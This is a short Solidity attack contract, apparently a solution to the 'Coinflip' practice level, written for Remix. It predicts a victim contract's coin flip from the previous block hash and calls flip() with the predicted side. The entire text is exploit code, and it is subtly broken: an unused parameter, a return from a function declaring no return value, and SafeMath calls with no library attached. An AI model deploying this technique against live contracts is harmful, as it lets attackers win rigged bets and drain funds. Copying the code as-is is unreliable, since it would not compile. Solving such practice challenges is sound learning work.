// in remix:
contract flipAttacker{
	Coinflip public victimContract;
	uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

	function attacker(bool _guess, address _adr) public {
		victimContract = Coinflip(_adr);
		uint256 blockValue = uint256(blockhash(block.number.sub(1)));
		uint256 coinFlip = blockValue.div(FACTOR);
		bool side = coinFlip == 1 ? true : false;

		return victimContract.flip(side);
	}

}